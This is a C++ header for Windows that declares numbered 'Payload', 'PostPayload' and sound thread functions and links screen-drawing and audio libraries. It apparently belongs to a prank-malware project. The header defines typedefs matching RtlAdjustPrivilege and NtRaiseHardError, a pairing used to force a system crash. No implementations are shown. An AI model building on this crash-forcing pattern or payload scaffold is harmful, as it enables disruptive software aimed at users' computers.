#pragma once

#include <Windows.h>
#include <cmath>
#include <time.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")

#define SigmaSym TEXT("\u01A9") /* Sigma symbol */
#define SRCRNBW (DWORD)0x922222

typedef NTSTATUS(NTAPI* RtlAP)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* NtRHE)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

typedef struct Payloads {
    DWORD payload;
    DWORD postPayload;
    DWORD sound;
    DWORD time;
};

static int x = GetSystemMetrics(SM_CXSCREEN);
static int y = GetSystemMetrics(SM_CYSCREEN);

DWORD random();

COLORREF WINAPI Hue(int);
RGBTRIPLE WINAPI prgbHue(int);

DWORD WINAPI WindowCaptions();
DWORD WINAPI OpenFiles();

DWORD WINAPI Sound1(LPVOID);
DWORD WINAPI Sound2(LPVOID);
DWORD WINAPI Sound3(LPVOID);
DWORD WINAPI Sound4(LPVOID);
DWORD WINAPI Sound5(LPVOID);
DWORD WINAPI Sound6(LPVOID);
DWORD WINAPI Sound7(LPVOID);

DWORD WINAPI PostPayload1(LPVOID);
DWORD WINAPI Payload1(LPVOID);
DWORD WINAPI Payload2(LPVOID);
DWORD WINAPI Payload3(LPVOID);
DWORD WINAPI Payload4(LPVOID);
DWORD WINAPI PostPayload5(LPVOID);
DWORD WINAPI Payload5(LPVOID);
DWORD WINAPI PostPayload6(LPVOID);
DWORD WINAPI Payload6(LPVOID);
DWORD WINAPI Payload7(LPVOID);